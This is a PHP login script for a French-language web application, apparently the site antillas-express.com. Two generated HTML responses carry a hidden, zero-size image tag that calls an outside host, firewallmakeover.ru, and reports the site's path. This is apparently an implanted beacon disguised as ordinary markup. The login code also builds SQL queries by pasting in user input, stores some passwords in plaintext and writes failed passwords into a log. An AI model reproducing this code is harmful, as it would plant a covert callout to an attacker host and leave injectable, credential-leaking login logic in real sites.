<?php
include('lib/config.php');

/*	foreach($_POST as $clé => $valeur ) {
		echo $clé." = ".$valeur."<br>";
	}
	foreach($_GET as $clé => $valeur ) {
		echo $clé." = ".$valeur."<br>";
	}*/
//	exit();

if( isset( $_SESSION['LogId'] ) ) {
	$_POST['courriel'] = $_SESSION['LogId']['courriel'];
	$_POST['password'] = $_SESSION['LogId']['password'];
	unset($_SESSION['LogId']);
	sleep(1);

}

$redir_conn = '';



function GoForIt( $Direction )
{
	$script = '<html>';
	$script .= '<body><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>';
	$script .= "<script language='javascript'>";
	if( strlen($Direction ) ) 
		$script .= "	open('$Direction','_self' );";
	else
		$script .= "	open('client_traite.php','_self' );";
	$script .= "	if( top.window.frames[0] && top.window.frames[0].Rafraichie )"; 
	$script .= "		top.window.frames[0].Rafraichie();";
	$script .= '</script>';
	$script .= '</body>';
	$script .= '</html>';
	echo $script;
	exit();
} // GoForIt

if( (isset($_SESSION['local']) && ($_SESSION['local'] == 1)) || ( isset($_SERVER['HTTPS']) && !strcasecmp("on", $_SERVER['HTTPS'])) ) {
//echo "NomLogin = '".$_POST['courriel']."' mPasse='".$_POST['password']."'<br>";		
	
	if( isset($_POST['courriel']) && strlen($_POST['courriel'])) {
		if( isset($_POST['courriel']) ) 
			$_POST['courriel'] = CleanUp( $_POST['courriel'] );
		// Connection au serveur
		$connection = mysql_connect( $host, $user, $password)
			or die( "Connection impossible au serveur");
		$db = mysql_select_db( $database, $connection )
			or die("La base de données ne peut être sélectionnée");
		
		$sql = "SELECT NomLogin, Priorite FROM $database.secur WHERE NomLogin = '".$_POST['courriel']."';";
		if( $result = mysql_query( $sql, $connection ) ) {
			if( mysql_num_rows( $result ) == 1 ) {	// Le nom de login est trouvé
				$ligne = mysql_fetch_array($result,MYSQL_ASSOC);
				extract($ligne);
				if( $Priorite < 10) 
					$sql = " SELECT * FROM $database.secur WHERE NomLogin = '".$_POST['courriel']."' AND mPasse=password('".$_POST['password']."');";		
				else
					$sql = " SELECT * FROM $database.secur WHERE NomLogin = '".$_POST['courriel']."' AND mPasse='".$_POST['password']."';";
				$result2 = mysql_query( $sql );
				if(  $result2 && ( mysql_num_rows( $result2 ) > 0) ) {
					$ligne = mysql_fetch_array($result2,MYSQL_ASSOC);
					extract($ligne);
					$Message = "**** CONNECTION REUSSI =>$NoClient";
					$sql = "INSERT INTO $mysql_base.trace ( NomLogin, DateLogin, Operation, Code )";
					$sql .= "VALUES ('".$_POST['courriel']."','$Now', '$Message', 2)";
					mysql_query( $sql, $handle );
					
					destroy( session_id());
					session_regenerate_id();
		//						session_regenerate_id(true);
							 
		//						unset( $_SESSION['redir'] );
					$_SESSION['auth'] = "yes";
							
					$_SESSION['NomLogin'] = strtoupper($_POST['courriel']);
					session_name ( $_SESSION['NomLogin'] );
					$_SESSION['Prio'] = $Priorite;
					$_SESSION['SLangue'] = $Langue;
					
					// On laisse une trace du passage
					Suivi_log('***** CONNECTION *****', $NoClient );
					
		/*						$sql = "INSERT INTO $database.login ( NomLogin, DateLogin, Operation, NoId )";
					$sql .= "VALUES ('".$_SESSION['NomLogin']."','$Now', '***** CONNECTION *****', '$NoClient')";
					mysql_query( $sql, $connection );*/
		
		         $sql =  "UPDATE secur SET Acces='OUI' WHERE  NomLogin = '".$_SESSION['NomLogin']."'";
			  		mysql_query( $sql, $connection );
						
					$infosClient = infos_client( $NoClient );
					if( !count($infosClient) ){
						$_SESSION[$_SERVER['SERVER_NAME']] = 0;
						GoForIt( 'client_recherche.php' );
					}
		
					// Histoire de valider la procedure d'avertissement de ROBOT
		/*						
					if( $infosClient['Courriel'] == "postmaster@transant.com" )
						$_SESSION['isRobot'] = true;*/  
					$_SESSION['NoContact'] = $NoClient;
					if(	!eregi ("^([a-z0-9_]|\\-|\\.)+@(([a-z0-9_]|\\-)+\\.)+[a-z]{2,4}$", $_POST['courriel']) ||
							!strlen($infosClient['Rue']) || !strlen($infosClient['Ville']) || 
							!strlen($infosClient['Province']) || !strlen($infosClient['Pays']) ) {
						$_SESSION['redir'] = $redir_conn; 
						GoForIt( 'client_modif.php?force=1' );
					}
					if( !strlen($_POST['password']) ) {
						$_SESSION['redir'] = $redir_conn; 
						GoForIt( 'password_modif.php' );
					}
					$_SESSION[$_SERVER['SERVER_NAME']] = $NoClient;
					GoForIt( $redir_conn );
				} // num2 > 0
				else {
					$Message = "**** CONNECTION RATÉ MPASSE INVALIDE=>".$_POST['password']."<=";
					$sql = "INSERT INTO $mysql_base.trace ( NomLogin, DateLogin, Operation, Code )";
					$sql .= "VALUES ('".$_POST['courriel']."','$Now', '$Message', 3)";
					mysql_query( $sql, $handle );
				}
			} // if num == 1
		} // Si Nom Existe
		else {
			$Message = "**** CONNECTION RATÉ COURRIEL INVALIDE";
			$sql = "INSERT INTO $mysql_base.trace ( NomLogin, DateLogin, Operation, Code )";
			$sql .= "VALUES ('".$_POST['courriel']."','$Now', '$Message', 4)";
			mysql_query( $sql, $handle );
		}
		GoForIt();
	}
}
else {
		$_SESSION['LogId']['courriel'] = $_POST['courriel'];
		$_SESSION['LogId']['password'] = $_POST['password'];
		$script = '<html>';
		$script .= '<body><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>';
		$script .= "<script language='javascript'>";
		$script .= "	open('https://www.antillas-express.com/index.php?sid=".session_id()."&appel=go_connect.php','_top' );";
		$script .= '</script>';
		$script .= '</body>';
		$script .= '</html>';
		echo $script;
		exit();
}

?>